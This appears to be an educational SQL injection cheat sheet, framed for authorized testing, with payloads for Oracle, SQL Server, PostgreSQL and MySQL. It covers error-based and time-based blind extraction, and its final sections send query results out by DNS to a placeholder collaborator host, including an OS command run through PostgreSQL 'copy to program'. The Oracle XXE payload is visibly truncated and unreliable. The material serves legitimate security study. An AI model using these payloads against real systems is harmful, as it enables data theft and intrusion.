SQL Injection Cheat Sheet

A practical reference for SQL injection syntax across Oracle, Microsoft SQL Server, PostgreSQL, and MySQL. The examples below are organized by the task they help perform: string manipulation, comments, database discovery, conditional behavior, time delays, and out-of-band techniques.

Learning / authorized testing: Use these techniques only against systems you own, explicitly have permission to test, or intentionally vulnerable training environments such as PortSwigger Web Security Academy.

1. String Concatenation

String concatenation combines multiple strings into one string. The syntax differs between database platforms.

DatabaseSyntax
Oracle'foo'||'bar'
Microsoft'foo'+'bar'
PostgreSQL'foo'||'bar'
MySQL'foo' 'bar' (space between strings)
CONCAT('foo','bar')

2. Substring

A substring function extracts part of a string using an offset and a length. The offset index is 1-based in these examples.

Each expression below returns ba:

DatabaseSyntax
OracleSUBSTR('foobar', 4, 2)
MicrosoftSUBSTRING('foobar', 4, 2)
PostgreSQLSUBSTRING('foobar', 4, 2)
MySQLSUBSTRING('foobar', 4, 2)

3. Comments

SQL comments can cause the remainder of a query to be ignored after the injected input. Comment syntax differs between databases.

DatabaseSyntax
Oracle--comment
Microsoft--comment
/*comment*/
PostgreSQL--comment
/*comment*/
MySQL#comment
\-- comment (space after --)
/*comment*/

4. Database Version

Querying the database version can help identify the database technology and version during authorized security testing.

DatabaseSyntax
OracleSELECT banner FROM v$version
SELECT version FROM v$instance
MicrosoftSELECT @@version
PostgreSQLSELECT version()
MySQLSELECT @@version

5. Database Contents

Database metadata can be used to identify tables and columns. The exact metadata sources depend on the database platform.

DatabaseTablesColumns
Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

6. Conditional Errors

Conditional error techniques test a Boolean condition and deliberately trigger a database error when that condition is true. This can be useful when investigating error-based or blind SQL injection behavior.

DatabaseExample
Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

7. Extracting Data via Visible Error Messages

Some database errors may include values produced by a query. In a vulnerable application, this can potentially expose sensitive information through the application's error response.

DatabaseExampleExample Result
Microsoft SELECT 'foo' WHERE 1 = (SELECT 'secret') Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL SELECT CAST((SELECT password FROM users LIMIT 1) AS int) invalid input syntax for integer: "secret"
MySQL SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) XPATH syntax error: '\secret'

8. Batched (Stacked) Queries

Batched queries allow multiple SQL statements to execute in succession. The subsequent query results are not normally returned to the application, so this technique is mainly relevant to blind vulnerabilities where the second query causes a detectable side effect.

DatabaseSyntax / Support
OracleDoes not support batched queries.
MicrosoftQUERY-1-HERE; QUERY-2-HERE
QUERY-1-HERE QUERY-2-HERE
PostgreSQLQUERY-1-HERE; QUERY-2-HERE
MySQLQUERY-1-HERE; QUERY-2-HERE
MySQL note: Batched queries typically cannot be used for SQL injection, but they may occasionally be possible when the target application uses particular PHP or Python APIs to communicate with MySQL.

9. Time Delays

A time-delay technique deliberately makes the database pause while processing a query. An unconditional 10-second delay can be produced using the following database-specific syntax.

DatabaseExample
Oracledbms_pipe.receive_message(('a'),10)
MicrosoftWAITFOR DELAY '0:0:10'
PostgreSQLSELECT pg_sleep(10)
MySQLSELECT SLEEP(10)

10. Conditional Time Delays

Instead of always delaying, a condition can determine whether the delay occurs. This is useful when testing blind SQL injection through measurable response times.

DatabaseExample
Oracle SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

11. DNS Lookup

Out-of-band SQL injection can sometimes be investigated by causing the database to perform a DNS lookup to an external domain. In PortSwigger labs, Burp Collaborator can provide a unique domain and can be used to observe whether an interaction occurred.

Oracle

SELECT EXTRACTVALUE(xmltype(' %remote;]>'),'/l') FROM dual

The source notes that this older technique relies on an XXE-related vulnerability. A technique for fully patched Oracle installations is also provided, but it requires elevated privileges: 

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')

Microsoft

exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'

PostgreSQL

copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

MySQL

The following techniques work on Windows only:

LOAD_FILE('\\BURP-COLLABORATOR-SUBDOMAIN\a')
SELECT ... INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'

12. DNS Lookup with Data Exfiltration

A more advanced out-of-band technique can cause the database to perform a DNS lookup to a domain that contains data returned by an injected query. Burp Collaborator can then be used to observe the resulting interaction and inspect the transmitted value.

Oracle

SELECT EXTRACTVALUE(xmltype(' %remote;]>'),'/l') FROM dual

Microsoft

declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')

PostgreSQL

create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;

SELECT f();

MySQL

The following technique works on Windows only:

SELECT YOUR-QUERY-HERE INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'

Quick Mental Model

When studying SQL injection, think in this order:

  1. Identify the database: Oracle, Microsoft, PostgreSQL, or MySQL.
  2. Understand the original query: Where does the input enter?
  3. Understand syntax: concatenation, substrings, comments, and database-specific functions.
  4. Determine the response type: visible results, errors, Boolean differences, timing, or out-of-band interaction.
  5. Choose the appropriate technique: error-based, blind, time-based, UNION-based, or OAST.
  6. Verify the result: Don't assume a payload worked simply because it was accepted.

Key Takeaways

  • SQL syntax differs significantly between database platforms.
  • Knowing the database type helps determine which syntax is available.
  • Comments can change how the remainder of a vulnerable query is interpreted.
  • Metadata tables can reveal database structure during authorized testing.
  • Blind SQL injection can rely on Boolean behavior, errors, timing, or out-of-band interactions.
  • Time delays are useful when the application does not directly reveal query results.
  • DNS/OAST techniques can provide evidence of server-side execution when normal responses reveal nothing.
  • The exact technique depends on both the database and the application's query context.
